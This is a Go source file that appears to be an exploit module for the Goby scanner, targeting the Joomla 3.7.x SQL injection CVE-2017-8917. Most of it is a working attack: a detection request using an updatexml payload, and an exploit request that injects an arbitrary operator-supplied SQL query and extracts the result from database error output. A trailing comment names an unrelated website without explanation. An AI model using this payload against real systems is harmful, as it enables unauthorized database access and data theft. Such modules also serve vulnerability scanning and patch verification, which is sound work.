package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Joomla 3.7.0 SQLI (CVE-2017-8917)",
    "Description": "SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute arbitrary SQL commands via unspecified vectors.",
    "Product": "Joomla",
    "Homepage": "https://www.joomla.org/",
    "DisclosureDate": "2021-06-16",
    "Author": "sharecast.net@gmail.com",
    "GobyQuery": "app=\"Joomla\"",
    "Level": "2",
    "Impact": "<p>Hackers can execute SQL statements directly, so as to control the whole server: data acquisition, data modification, data deletion, etc.</p>",
    "Recommendation": "<p>1. the data input by users should be strictly filtered in the web code.</p><p>2. deploy web application firewall to monitor database operation.</p><p>3. upgrade to the latest version.</p>",
    "References": [
        "https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select+database()"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1,updatexml(0x23,concat(0x7c,substring(md5(0x0c),1,10),0x7c),0x7c)",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "|58c89562f5|",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,({{{sql}}})),1)",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error:\\s+'(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2017-8917"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6813"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//https://www.hizupa.rs/
